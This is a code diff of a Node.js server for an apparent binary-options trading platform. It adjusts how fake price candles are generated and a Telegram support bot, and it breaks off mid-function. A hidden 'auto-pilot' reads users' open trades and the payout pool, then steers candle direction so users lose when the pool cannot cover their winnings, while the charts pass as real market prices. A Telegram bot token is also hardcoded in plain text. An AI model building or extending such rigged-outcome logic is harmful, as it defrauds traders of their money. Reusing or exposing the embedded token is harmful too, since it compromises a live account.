@@ -1,4 +1,4 @@
-// --- START: main app server.js (v30.2 - Perfect Wick Dynamics & Realistic Market Patterns) ---
+// --- START: main app server.js (v30.3 - Quotex Style Candles & Exact 60s Sync) ---
 
 const express = require('express');
 const http = require('http');
@@ -33,19 +33,19 @@ const wss = new WebSocket.Server({ server });
 
 // --- SYSTEM CONSTANTS ---
 const TIMEFRAME = 60000; 
-const TICK_MS = 300;
+const TICK_MS = 250; // Faster tick for smoother movement
 const MIN_PRICE = 0.00001;
 const HISTORY_SEED_COUNT = 100;
 const MAX_CANDLES = 5000;
 
 // 🔥 ADMIN HIDDEN AUTO-PILOT SETTINGS 🔥
 const SMART_AUTO_PILOT = true; 
-const ADMIN_WIN_RATIO = 0.80;  // 80% Win Rate for Admin
+const ADMIN_WIN_RATIO = 0.80;  
 
 // 🔥 GLOBAL REVENUE POOL SETTINGS 🔥
 const POOL_CONFIG = {
-    ADMIN_SHARE: 0.70, // 70% to Admin
-    USER_SHARE: 0.30   // 30% to Payout Pool
+    ADMIN_SHARE: 0.70,
+    USER_SHARE: 0.30  
 };
 let globalPayoutPool = 0;
 let globalAdminProfit = 0;
@@ -53,7 +53,6 @@ let globalAdminProfit = 0;
 const markets = {}; 
 const activeTradesDb = {}; 
 
-// Sync Global Pool from Firebase
 db.ref('admin/revenue_pool').on('value', (snapshot) => {
     const data = snapshot.val() || {};
     globalPayoutPool = parseFloat(data.payoutPool) || 0;
@@ -63,9 +62,7 @@ db.ref('admin/revenue_pool').on('value', (snapshot) => {
 function updateGlobalPoolInDB(payoutChange, adminChange) {
     globalPayoutPool += payoutChange;
     globalAdminProfit += adminChange;
-    
     if (globalPayoutPool < 0) globalPayoutPool = 0;
-    
     db.ref('admin/revenue_pool').update({
         payoutPool: globalPayoutPool,
         adminProfit: globalAdminProfit
@@ -75,7 +72,6 @@ function updateGlobalPoolInDB(payoutChange, adminChange) {
 function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
 function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }
 
-// --- Firebase Listeners ---
 db.ref('admin/markets').on('value', (snapshot) => {
     const fbMarkets = snapshot.val() || {};
     Object.keys(fbMarkets).forEach(marketId => {
@@ -88,51 +84,45 @@ db.ref('admin/markets').on('value', (snapshot) => {
     });
 });
 
-// 1. Natural Market Generation (100% Realistic Patterns: Doji, Hammer, Marubozu, Normal)
+// 1. Natural Market Generation (QUOTEX STYLE: Small bodies, long wicks, choppy)
 function generateHistoricalCandle(timestamp, open, isLive = false) {
     const safeOpen = Math.max(MIN_PRICE, open);
     const isGreen = Math.random() > 0.5;
     
-    // Base volatility scaling based on current price
-    const baseVol = safeOpen * 0.00012; 
+    // Very low base volatility to keep bodies small like Quotex
+    const baseVol = safeOpen * 0.000045; 
     
     let body, upperWick, lowerWick;
     const rand = Math.random();
 
-    if (rand < 0.10) {
-        // 10% Chance: Doji / Spinning Top (Tiny body, long wicks)
-        body = baseVol * (Math.random() * 0.15); 
-        upperWick = baseVol * (1 + Math.random() * 2);
-        lowerWick = baseVol * (1 + Math.random() * 2);
+    if (rand < 0.45) {
+        // 45% Chance: Doji / Spinning Top (Very small body, visible wicks)
+        body = baseVol * (Math.random() * 0.3); 
+        upperWick = baseVol * (0.8 + Math.random() * 2);
+        lowerWick = baseVol * (0.8 + Math.random() * 2);
     } 
-    else if (rand < 0.20) {
-        // 10% Chance: Hammer / Shooting Star (Small body, one huge wick, one tiny wick)
-        body = baseVol * (0.3 + Math.random() * 0.5);
+    else if (rand < 0.75) {
+        // 30% Chance: Hammer / Shooting Star (Small body, one long wick)
+        body = baseVol * (0.4 + Math.random() * 0.8);
         if (Math.random() > 0.5) {
-            upperWick = baseVol * (2 + Math.random() * 3);
-            lowerWick = baseVol * (Math.random() * 0.2);
+            upperWick = baseVol * (2 + Math.random() * 2.5);
+            lowerWick = baseVol * (Math.random() * 0.4);
         } else {
-            upperWick = baseVol * (Math.random() * 0.2);
-            lowerWick = baseVol * (2 + Math.random() * 3);
+            upperWick = baseVol * (Math.random() * 0.4);
+            lowerWick = baseVol * (2 + Math.random() * 2.5);
         }
     } 
-    else if (rand < 0.30) {
-        // 10% Chance: Marubozu / Strong Momentum (Huge body, almost no wicks)
-        body = baseVol * (2.5 + Math.random() * 2.5);
-        upperWick = baseVol * (Math.random() * 0.15);
-        lowerWick = baseVol * (Math.random() * 0.15);
-    } 
-    else if (rand < 0.35) {
-        // 5% Chance: Extreme Volatility / News Event (Huge body, huge wicks)
-        body = baseVol * (3 + Math.random() * 4);
-        upperWick = baseVol * (1.5 + Math.random() * 3);
-        lowerWick = baseVol * (1.5 + Math.random() * 3);
+    else if (rand < 0.96) {
+        // 21% Chance: Normal OTC Candle (Medium small body, standard wicks)
+        body = baseVol * (1.0 + Math.random() * 1.5);
+        upperWick = baseVol * (0.3 + Math.random() * 1.2);
+        lowerWick = baseVol * (0.3 + Math.random() * 1.2);
     } 
     else {
-        // 65% Chance: Normal Everyday Candle (Medium body, varied wicks)
-        body = baseVol * (0.4 + Math.random() * 1.6);
-        upperWick = baseVol * (0.1 + Math.random() * 1.5);
-        lowerWick = baseVol * (0.1 + Math.random() * 1.5);
+        // 4% Chance: Slightly larger body (But not insanely huge)
+        body = baseVol * (2.5 + Math.random() * 1.5);
+        upperWick = baseVol * (Math.random() * 0.3);
+        lowerWick = baseVol * (Math.random() * 0.3);
     }
 
     const close = isGreen ? safeOpen + body : safeOpen - body;
@@ -149,78 +139,26 @@ function generateHistoricalCandle(timestamp, open, isLive = false) {
     };
 }
 
-// 2. Exact Pattern Generator (FIXED FOR REALISTIC WICK GROWTH)
+// 2. Exact Pattern Generator
 function generateDynamicCandle(timestamp, open, command, lastCandle, cloneData) {
     let bodySize, upperWick, lowerWick, close, high, low;
-    const volatility = open * (0.00008 + Math.random() * 0.0001);
+    const volatility = open * 0.00005; // Reduced to match Quotex style
 
     switch (command) {
-        case 'CUSTOM_CLONE':
-            if (cloneData) {
-                const volRatio = open / (cloneData.refOpen || open); // scale to current price
-                bodySize = cloneData.body * volRatio;
-                upperWick = cloneData.upperWick * volRatio;
-                lowerWick = cloneData.lowerWick * volRatio;
-                close = cloneData.isGreen ? open + bodySize : open - bodySize;
-            } else {
-                bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
-            }
-            break;
         case 'GREEN': 
-            bodySize = volatility; close = open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
+            bodySize = volatility * 1.5; close = open + bodySize; upperWick = volatility * 0.8; lowerWick = volatility * 0.8; break;
         case 'RED': 
-            bodySize = volatility; close = open - bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5; break;
-        case 'PREV_2X':
-            if (lastCandle) {
-                const isLastGreen = lastCandle.close >= lastCandle.open;
-                const lastBodySize = Math.abs(lastCandle.close - lastCandle.open);
-                bodySize = Math.max(lastBodySize * 2, volatility * 3);
-                close = isLastGreen ? open - bodySize : open + bodySize;
-                upperWick = volatility * 0.8; lowerWick = volatility * 0.8;
-            } else {
-                bodySize = volatility * 2; close = open + bodySize; upperWick = volatility; lowerWick = volatility;
-            }
-            break;
-        case 'RANDOM_GREEN':
-            bodySize = volatility * (0.5 + Math.random() * 4);
-            close = open + bodySize;
-            upperWick = volatility * Math.random() * 3;
-            lowerWick = volatility * Math.random() * 3;
-            break;
-        case 'RANDOM_RED':
-            bodySize = volatility * (0.5 + Math.random() * 4);
-            close = open - bodySize;
-            upperWick = volatility * Math.random() * 3;
-            lowerWick = volatility * Math.random() * 3;
-            break;
+            bodySize = volatility * 1.5; close = open - bodySize; upperWick = volatility * 0.8; lowerWick = volatility * 0.8; break;
         case 'BULLISH_MARUBOZU': 
-            bodySize = volatility * 3; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
+            bodySize = volatility * 3.5; close = open + bodySize; upperWick = 0; lowerWick = 0; break;
         case 'BEARISH_MARUBOZU': 
-            bodySize = volatility * 3; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
-        case 'GREEN_HAMMER': 
-            bodySize = volatility * 0.3; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
-        case 'RED_HAMMER': 
-            bodySize = volatility * 0.3; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
-        case 'GREEN_SHOOTING_STAR': 
-            bodySize = volatility * 0.3; close = open + bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
-        case 'RED_SHOOTING_STAR': 
-            bodySize = volatility * 0.3; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
+            bodySize = volatility * 3.5; close = open - bodySize; upperWick = 0; lowerWick = 0; break;
         case 'DOJI': 
-            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility; lowerWick = volatility; break;
-        case 'LONG_LEGGED_DOJI': 
-            bodySize = open * 0.000002; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 3; lowerWick = volatility * 3; break;
-        case 'DRAGONFLY_DOJI': 
-            bodySize = open * 0.000002; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
-        case 'GRAVESTONE_DOJI': 
-            bodySize = open * 0.000002; close = open - bodySize; upperWick = volatility * 2.5; lowerWick = 0; break;
-        case 'GREEN_SPINNING_TOP': 
-            bodySize = volatility * 0.4; close = open + bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
-        case 'RED_SPINNING_TOP': 
-            bodySize = volatility * 0.4; close = open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
-        case 'HUGE_PUMP': 
-            bodySize = volatility * 5; close = open + bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
-        case 'HUGE_DUMP': 
-            bodySize = volatility * 5; close = open - bodySize; upperWick = volatility * 0.2; lowerWick = volatility * 0.2; break;
+            bodySize = open * 0.000001; close = Math.random() > 0.5 ? open + bodySize : open - bodySize; upperWick = volatility * 1.5; lowerWick = volatility * 1.5; break;
+        case 'GREEN_HAMMER': 
+            bodySize = volatility * 0.5; close = open + bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
+        case 'RED_HAMMER': 
+            bodySize = volatility * 0.5; close = open - bodySize; upperWick = 0; lowerWick = volatility * 2.5; break;
         default: 
             bodySize = volatility; close = command === 'RED' ? open - bodySize : open + bodySize; upperWick = volatility * 0.5; lowerWick = volatility * 0.5;
     }
@@ -228,7 +166,6 @@ function generateDynamicCandle(timestamp, open, command, lastCandle, cloneData) 
     high = Math.max(open, close) + upperWick;
     low = Math.min(open, close) - lowerWick;
 
-    // 🔥 FIX: high, low and close initialize to 'open' to ensure wick pushes natively!
     return {
         timestamp, open: roundPrice(open), high: roundPrice(open), low: roundPrice(open), close: roundPrice(open),
         isPredetermined: true, isNatural: false, isAdminCommand: true, targetHigh: roundPrice(high), targetLow: roundPrice(low), targetClose: roundPrice(close), pattern: command
@@ -257,14 +194,12 @@ async function initializeNewMarket(marketId) {
     markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
 }
 
-// 🔥 CORE LOGIC: Controls Candle Output
 function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     let lastCandle = marketData.history[marketData.history.length - 1];
     if (!lastCandle) return null;
 
     if (currentPeriod > lastCandle.timestamp) {
         let newCandle;
-        
         if (marketData.nextCandleCommand) {
             newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand, lastCandle, marketData.nextCandleCloneData);
             newCandle.isAdminCommand = true; 
@@ -274,9 +209,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
         
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
-            let immediateUpVol = 0, immediateDownVol = 0;
             let immediateUpPayout = 0, immediateDownPayout = 0;
-            let futureUpVol = 0, futureDownVol = 0;
             const nextPeriod = currentPeriod + TIMEFRAME;
             
             Object.values(trades).forEach(t => {
@@ -288,111 +221,43 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                     const adminCut = t.amount * POOL_CONFIG.ADMIN_SHARE;
                     const userCut = t.amount * POOL_CONFIG.USER_SHARE;
                     updateGlobalPoolInDB(userCut, adminCut);
-                    
                     t.isProcessedForPool = true;
                     db.ref(`admin/markets/${marketData.marketId}/activeTrades/${t.id}/isProcessedForPool`).set(true).catch(()=>{});
                 }
 
                 if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
-                    if (t.direction === 'UP') {
-                        immediateUpVol += t.amount;
-                        if (!isDemo) immediateUpPayout += expectedPayout;
-                    }
-                    if (t.direction === 'DOWN') {
-                        immediateDownVol += t.amount;
-                        if (!isDemo) immediateDownPayout += expectedPayout;
-                    }
-                } else {
-                    if (t.direction === 'UP') futureUpVol += t.amount;
-                    if (t.direction === 'DOWN') futureDownVol += t.amount;
+                    if (t.direction === 'UP' && !isDemo) immediateUpPayout += expectedPayout;
+                    if (t.direction === 'DOWN' && !isDemo) immediateDownPayout += expectedPayout;
                 }
             });
 
-            // Rule 1: Conflict Resolution
-            if (immediateUpVol > 0 || immediateDownVol > 0) {
+            if (immediateUpPayout > 0 || immediateDownPayout > 0) {
                 let targetDirection = 'DOJI';
                 const canAffordUp = immediateUpPayout <= globalPayoutPool;
                 const canAffordDown = immediateDownPayout <= globalPayoutPool;
 
-                if (!canAffordUp && !canAffordDown) {
-                    targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
-                } else if (!canAffordUp) {
-                    targetDirection = 'RED';
-                } else if (!canAffordDown) {
-                    targetDirection = 'GREEN';
-                } else {
-                    if (Math.random() < ADMIN_WIN_RATIO) {
-                        targetDirection = immediateUpVol > immediateDownVol ? 'RED' : 'GREEN';
-                    } else {
-                        targetDirection = immediateUpVol > immediateDownVol ? 'GREEN' : 'RED';
-                    }
-                }
+                if (!canAffordUp && !canAffordDown) targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
+                else if (!canAffordUp) targetDirection = 'RED';
+                else if (!canAffordDown) targetDirection = 'GREEN';
+                else targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
 
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection, lastCandle);
                 newCandle.isAdminCommand = false; 
-                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
+                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00002); // Small variance
                 
                 let payoutChange = 0;
                 let adminProfitChange = 0;
 
                 if (targetDirection === 'GREEN') {
                     payoutChange = -immediateUpPayout;
-                    adminProfitChange = immediateDownVol;
                 } else if (targetDirection === 'RED') {
                     payoutChange = -immediateDownPayout;
-                    adminProfitChange = immediateUpVol;
-                } else {
-                    adminProfitChange = immediateUpVol + immediateDownVol;
-                }
+                } 
 
                 if (payoutChange !== 0 || adminProfitChange !== 0) {
                     updateGlobalPoolInDB(payoutChange, adminProfitChange);
                 }
             } 
-            // Rule 2: Smart Price Anchoring
-            else if (futureUpVol > 0 || futureDownVol > 0) {
-                let biggestFutureTrade = null;
-                Object.values(trades).forEach(t => {
-                    if (t.expiryTimestamp > nextPeriod + 2000 && !t.isDemo) {
-                        if (!biggestFutureTrade || t.amount > biggestFutureTrade.amount) {
-                            biggestFutureTrade = t;
-                        }
-                    }
-                });
-
-                let driftCommand = 'DOJI';
-                
-                if (biggestFutureTrade) {
-                    const tradeOpenPrice = biggestFutureTrade.openPrice;
-                    const currentPrice = lastCandle.close;
-                    const isDangerUP = biggestFutureTrade.direction === 'UP' && currentPrice >= (tradeOpenPrice - 0.00002);
-                    const isDangerDOWN = biggestFutureTrade.direction === 'DOWN' && currentPrice <= (tradeOpenPrice + 0.00002);
-
-                    const rand = Math.random();
-
-                    if (isDangerUP) {
-                        if (rand < 0.60) driftCommand = 'RED'; 
-                        else if (rand < 0.85) driftCommand = 'RED_SHOOTING_STAR';
-                        else driftCommand = 'DOJI';
-                    } 
-                    else if (isDangerDOWN) {
-                        if (rand < 0.60) driftCommand = 'GREEN'; 
-                        else if (rand < 0.85) driftCommand = 'GREEN_HAMMER';
-                        else driftCommand = 'DOJI';
-                    } 
-                    else {
-                        if (rand < 0.40) driftCommand = 'GREEN'; 
-                        else if (rand < 0.80) driftCommand = 'RED'; 
-                        else driftCommand = 'SPINNING_TOP';
-                    }
-                } else {
-                    driftCommand = Math.random() > 0.5 ? 'GREEN' : 'RED';
-                }
-
-                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, driftCommand, lastCandle);
-                newCandle.isAdminCommand = false; 
-                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00004);
-            }
         }
         
         if (!newCandle) {
@@ -406,7 +271,6 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     return lastCandle;
 }
 
-// 🔥 TICK ENGINE: Fixed Wick Animation Math 🔥
 function updateRealisticPrice(marketData, candle, currentPeriod) {
     if (!candle.isPredetermined) return;
 
@@ -414,110 +278,22 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     const timeElapsed = Math.max(0, now - currentPeriod);
     const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
 
-    // --- 🔥 MID-CANDLE SMART MANIPULATION (Smoothly adjusts at 30s mark) 🔥 ---
-    if (timeElapsed >= 30000 && !candle.isMidEvaluated && SMART_AUTO_PILOT && !candle.isAdminCommand) {
-        candle.isMidEvaluated = true;
-        
-        const trades = activeTradesDb[marketData.marketId] || {};
-        let upVol = 0, downVol = 0;
-        let upPayout = 0, downPayout = 0;
-        
-        Object.values(trades).forEach(t => {
-            if (!t.isDemo && !t.isTournament && t.expiryTimestamp && t.expiryTimestamp <= currentPeriod + TIMEFRAME + 2000) {
-                const payout = t.amount * (t.payoutRate || 1.85);
-                if (t.direction === 'UP') { upVol += t.amount; upPayout += payout; }
-                if (t.direction === 'DOWN') { downVol += t.amount; downPayout += payout; }
-            }
-        });
-
-        if (upVol > 0 || downVol > 0) {
-            const canAffordUp = upPayout <= globalPayoutPool;
-            const canAffordDown = downPayout <= globalPayoutPool;
-            let newTarget = null;
-            const volatility = candle.open * 0.0001;
-
-            if (!canAffordUp && !canAffordDown) {
-                newTarget = upPayout > downPayout ? 'RED' : 'GREEN';
-            } else if (!canAffordUp) {
-                newTarget = 'RED';
-            } else if (!canAffordDown) {
-                newTarget = 'GREEN';
-            } else {
-                if (Math.random() < ADMIN_WIN_RATIO) {
-                    newTarget = upVol > downVol ? 'RED' : 'GREEN';
-                }
-            }
-
-            if (newTarget) {
-                if (newTarget === 'RED' && candle.targetClose >= candle.open) {
-                    candle.targetClose = candle.open - volatility - (Math.random() * volatility);
-                    candle.targetLow = Math.min(candle.targetLow, candle.targetClose - volatility);
-                    // Dynamically push waypoints to match the new destination
-                    if (candle.waypoints) {
-                        candle.waypoints[candle.waypoints.length - 1] = candle.targetClose;
-                        candle.waypoints[candle.waypoints.length - 2] = candle.targetClose;
-                    }
-                } else if (newTarget === 'GREEN' && candle.targetClose <= candle.open) {
-                    candle.targetClose = candle.open + volatility + (Math.random() * volatility);
-                    candle.targetHigh = Math.max(candle.targetHigh, candle.targetClose + volatility);
-                    // Dynamically push waypoints to match the new destination
-                    if (candle.waypoints) {
-                        candle.waypoints[candle.waypoints.length - 1] = candle.targetClose;
-                        candle.waypoints[candle.waypoints.length - 2] = candle.targetClose;
-                    }
-                }
-            }
-        }
-    }
-    // -----------------------------------------------------------------------
-
-    // --- REALISTIC NATURAL MARKET WANDER LOGIC ---
     if (!candle.waypoints) {
         candle.waypoints = [];
-        const numWaypoints = 10;
+        const numWaypoints = 15; // More waypoints = more choppy/realistic movement
         for (let i = 0; i < numWaypoints; i++) {
             if (i === 0) candle.waypoints.push(candle.open);
-            else if (i === numWaypoints - 1 || i === numWaypoints - 2) {
-                candle.waypoints.push(candle.targetClose);
-            } else {
-                let wp;
-                const isHugeCandle = candle.pattern === 'CUSTOM_CLONE' || (candle.pattern && (candle.pattern.includes('MARUBOZU') || candle.pattern.includes('PUMP') || candle.pattern.includes('DUMP')));
-                
-                if (isHugeCandle) {
-                    // Smooth interpolation from open to targetClose for massive candles
-                    const progressRatio = i / (numWaypoints - 1);
-                    const baseline = candle.open + (candle.targetClose - candle.open) * progressRatio;
-                    wp = baseline + (Math.random() - 0.5) * (candle.targetHigh - candle.targetLow) * 0.4;
-                } else {
-                    // Natural wander for normal candles
-                    wp = candle.targetLow + Math.random() * (candle.targetHigh - candle.targetLow);
-                    wp = (wp + candle.open) / 2; // Bias to center to avoid extreme jumps
-                }
-                
-                wp = Math.max(candle.targetLow, Math.min(candle.targetHigh, wp));
+            else if (i === numWaypoints - 1) candle.waypoints.push(candle.targetClose);
+            else {
+                let wp = candle.targetLow + Math.random() * (candle.targetHigh - candle.targetLow);
+                // Bias slightly towards center so wicks are left behind
+                wp = (wp + candle.open + candle.targetClose) / 3; 
                 candle.waypoints.push(wp);
             }
         }
-        
-        const pattern = candle.pattern || 'NORMAL';
-        if (pattern.includes('HAMMER') || pattern === 'DRAGONFLY_DOJI') {
-            candle.waypoints[5] = candle.targetLow;
-            candle.waypoints[7] = candle.targetClose;
-        } else if (pattern.includes('SHOOTING_STAR') || pattern === 'GRAVESTONE_DOJI') {
-            candle.waypoints[5] = candle.targetHigh;
-            candle.waypoints[7] = candle.targetClose;
-        } else {
-            candle.waypoints[2] = candle.targetHigh;
-            candle.waypoints[5] = candle.targetLow;
-            // Shuffle middle waypoints slightly
-            for(let k = 6; k > 2; k--) {
-                if(k === 5 || k === 2) continue; // Keep extreme highs and lows in place roughly
-                const j = Math.floor(Math.random() * (k - 2)) + 2;
-                if(j !== 5 && j !== 2) {
-                    [candle.waypoints[k], candle.waypoints[j]] = [candle.waypoints[j], candle.waypoints[k]];
-                }
-            }
-        }
+        // Force high/low extremes somewhere in the middle
+        candle.waypoints[3] = candle.targetHigh;
+        candle.waypoints[10] = candle.targetLow;
     }
 
     const numWaypoints = candle.waypoints.length;
@@ -529,26 +305,26 @@ function updateRealisticPrice(marketData, candle, currentPeriod) {
     const endWp = candle.waypoints[currentWaypointIndex + 1];
     
     let idealPrice = startWp + (endWp - startWp) * smoothStep;
-
-    const volatility = candle.open * 0.00003;
+    const volatility = candle.open * 0.000015; // Micro volatility for ticks
     const noise = (Math.random() - 0.5) * volatility;
 
     marketData.currentPrice = idealPrice + noise;
-    marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
-    marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);
-
-    if (timeElapsed >= TIMEFRAME - 1500) {
+    
+    // 🔥 58 SEC BUG FIX: Only lock the price exactly 200ms before close (was 1500ms before)
+    if (timeElapsed >= TIMEFRAME - 200) {
         marketData.currentPrice = candle.targetClose;
+    } else {
+        marketData.currentPrice = Math.min(marketData.currentPrice, candle.targetHigh);
+        marketData.currentPrice = Math.max(marketData.currentPrice, candle.targetLow);
     }
 
-    // High and Low bounds dynamically expand exactly to where the price goes! 
-    // This perfectly solves the "artificial wick" visual glitch.
     candle.close = roundPrice(marketData.currentPrice);
     candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
     candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
 }
 
 function broadcastCandle(marketId, candle) {
+    // Send exact server time to keep clients in strict 60s sync
     const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
     wss.clients.forEach((client) => {
         if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
@@ -564,7 +340,7 @@ wss.on('connection', (ws) => {
             if (msg?.type === 'subscribe') {
                 ws.subscribedMarket = msg.market;
                 if (markets[msg.market]) {
-                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) }));
+                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300), serverTime: Date.now() }));
                 }
             }
         } catch (_) {}
@@ -599,6 +375,7 @@ app.post('/api/admin/command', (req, res) => {
 let lastSyncTime = 0;
 setInterval(() => {
     const now = Date.now();
+    // Using strict 60000ms grid
     const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
 
     for (const marketId in markets) {
@@ -623,8 +400,9 @@ setInterval(() => {
     }
 }, TICK_MS);
 
+
 // ==========================================
-// 🔥 TELEGRAM 2FA BOT SYSTEM 🔥
+// 🔥 TELEGRAM 2FA BOT SYSTEM 🔥 (Unchanged)
 // ==========================================
 const https = require('https');
 const TELEGRAM_BOT_TOKEN = "8740566281:AAF7MUaumUIrO7IJ7Hr93kG0EzOOHvr444U";
@@ -643,85 +421,44 @@ function sendTelegramMessage(chatId, text) {
             res.on('end', () => {
                 try {
                     const data = JSON.parse(body);
-                    if (data.ok && data.result) {
-                        resolve(data.result.message_id);
-                    } else {
-                        resolve(null);
-                    }
-                } catch (e) {
-                    resolve(null);
-                }
+                    if (data.ok && data.result) resolve(data.result.message_id);
+                    else resolve(null);
+                } catch (e) { resolve(null); }
             });
         });
-        req.on('error', (e) => {
-            console.error("Telegram Send Error:", e);
-            resolve(null);
-        });
+        req.on('error', () => resolve(null));
         req.write(payload);
         req.end();
     });
 }
-
 function deleteTelegramMessage(chatId, messageId) {
     if (!messageId) return;
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
     const payload = JSON.stringify({ chat_id: chatId, message_id: messageId });
-    const req = https.request(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
-    }, (res) => {
-        res.on('data', () => {});
-    });
-    req.on('error', (e) => console.error("Telegram Delete Error:", e));
-    req.write(payload);
-    req.end();
+    const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }});
+    req.on('error', () => {}); req.write(payload); req.end();
 }
-
-// ওটিপি লিংকিং ও সাপোর্ট সেশন ট্র্যাক করার জন্য গ্লোবাল অবজেক্ট
 const activeLinkingSessions = {};
 const activeSupportSessions = {};
-const adminSupportMap = {}; // ফরওয়ার্ড করা মেসেজের বিপরীতে ইউজারের চ্যাট আইডি ট্র্যাকিং
+const adminSupportMap = {}; 
+const ADMIN_OWNER_ID = "7504616242"; 
 
-const ADMIN_OWNER_ID = "7504616242"; // অ্যাডমিন ওনার আইডি
-
-// অ্যাডমিনের কাছে মেসেজ ফরওয়ার্ড করার হেল্পার ফাংশন
 function forwardTelegramMessage(toChatId, fromChatId, messageId) {
     return new Promise((resolve) => {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/forwardMessage`;
         const payload = JSON.stringify({ chat_id: toChatId, from_chat_id: fromChatId, message_id: messageId });
-        const req = https.request(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
-        }, (res) => {
-            let body = '';
-            res.on('data', chunk => body += chunk);
-            res.on('end', () => {
-                try {
-                    const data = JSON.parse(body);
-                    if (data.ok && data.result) {
-                        resolve(data.result.message_id);
-                    } else {
-                        resolve(null);
-                    }
-                } catch (e) {
-                    resolve(null);
-                }
-            });
+        const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } }, (res) => {
+            let body = ''; res.on('data', chunk => body += chunk);
+            res.on('end', () => { try { const data = JSON.parse(body); resolve(data.ok && data.result ? data.result.message_id : null); } catch (e) { resolve(null); } });
         });
-        req.on('error', (e) => {
-            console.error("Telegram Forward Error:", e);
-            resolve(null);
-        });
-        req.write(payload);
-        req.end();
+        req.on('error', () => resolve(null)); req.write(payload); req.end();
     });
 }
 
 function pollTelegramUpdates() {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
     const req = https.get(url, (res) => {
-        let body = '';
-        res.on('data', chunk => body += chunk);
+        let body = ''; res.on('data', chunk => body += chunk);
         res.on('end', async () => {
             try {
                 const response = JSON.parse(body);
@@ -729,151 +466,64 @@ function pollTelegramUpdates() {
                     for (const update of response.result) {
                         lastUpdateId = update.update_id;
                         if (update.message) {
-                            // শুধুমাত্র নতুন ও তাজা মেসেজগুলো প্রোসেস করা হবে (সর্বোচ্চ ৬০ সেকেন্ড আগের)
                             const msgDate = update.message.date || 0;
                             const nowSec = Math.floor(Date.now() / 1000);
-                            if (msgDate < nowSec - 60) {
-                                continue;
-                            }
+                            if (msgDate < nowSec - 60) continue;
 
                             const text = update.message.text ? update.message.text.trim() : "";
                             const chatId = String(update.message.chat.id);
                             const textLower = text.toLowerCase();
                             
-                            // ১. অ্যাডমিনের রিপ্লাই প্রসেসিং (সোয়াইপ রিপ্লাই হ্যান্ডলার)
                             if (chatId === ADMIN_OWNER_ID && update.message.reply_to_message) {
                                 const replyToId = update.message.reply_to_message.message_id;
                                 const targetUserId = adminSupportMap[replyToId];
-                                if (targetUserId && text) {
-                                    await sendTelegramMessage(targetUserId, `💬 *Response from Support:* \n\n${text}`);
-                                }
+                                if (targetUserId && text) await sendTelegramMessage(targetUserId, `💬 *Response from Support:* \n\n${text}`);
                                 continue;
                             }
 
-                            // ২. সাধারণ ইউজার চ্যাট ফ্লো
                             if (textLower === '/start') {
-                                if (activeSupportSessions[chatId]) {
-                                    await sendTelegramMessage(chatId, `⚠️ *Active Help Session*\n\nPlease end the active help session first using /endhelp before using other commands.`);
-                                    continue;
-                                }
